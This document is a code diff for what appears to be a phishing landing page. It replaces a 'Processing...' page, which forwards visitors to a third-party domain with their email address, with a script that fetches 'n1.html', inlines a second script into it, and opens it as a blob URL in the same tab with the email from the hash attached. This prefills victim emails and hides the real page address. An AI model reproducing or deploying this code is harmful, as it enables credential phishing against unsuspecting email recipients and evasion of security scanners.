@@ -1,58 +1,43 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Processing...</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: white;
-    }
-    .container {
-      text-align: center;
-    }
-    .text {
-      margin-top: 15px;
-      font-size: 20px;
-      color: black;
-      opacity: 0.8;
-      font-family: Arial, sans-serif;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <!-- Your GIF animation -->
-    <img src="https://cdn.pixabay.com/animation/2023/08/21/13/31/13-31-04-403_512.gif" alt="Processing Animation" width="150" />
-    <div class="text">Processing...</div>
-  </div>
+<script>
+(function () {
 
-  <script>
-  setTimeout(() => {
-    // Get email from hash (remove the #)
-    const email = window.location.hash.substring(1);
+  // ✅ READ EMAIL FROM HASH (decode once)
+  const hash = window.location.hash;
+  const emailFromHash =
+    hash && hash.length > 1 ? decodeURIComponent(hash.slice(1)) : null;
 
-    // Base redirect URL
-    let redirectUrl = "https://burgerbrothersrestaurantgroupinc.com/n1.html";
+  fetch('n1.html')
+    .then(res => res.text())
+    .then(async html => {
 
-    // Append email if it exists
-    if (email) {
-      redirectUrl += "#" + encodeURIComponent(email);
-    }
+      let modifiedHtml = html;
 
-    window.location.href = redirectUrl;
-  }, 10000);
+      // ✅ INLINE next.js
+      try {
+        const nextResp = await fetch('next.js');
+        if (nextResp.ok) {
+          const nextJsText = await nextResp.text();
+          modifiedHtml = modifiedHtml.replace(
+            /<script\s+[^>]*src=["']next\.js["'][^>]*>\s*<\/script>/i,
+            '<script>' + nextJsText + '<\/script>'
+          );
+        }
+      } catch (e) {
+        console.warn('Could not inline next.js', e);
+      }
+
+      const blob = new Blob([modifiedHtml], { type: 'text/html' });
+      const blobUrl = URL.createObjectURL(blob);
+
+      // ✅ QUIET SAME-TAB REDIRECT (NO DOUBLE ENCODE)
+      if (emailFromHash) {
+        window.location.replace(blobUrl + '#' + emailFromHash);
+      } else {
+        window.location.replace(blobUrl);
+      }
+
+    })
+    .catch(err => console.error('Failed to load blob page:', err));
+
+})();
 </script>
-
-</body>
-
-</html>
-
-
-
-
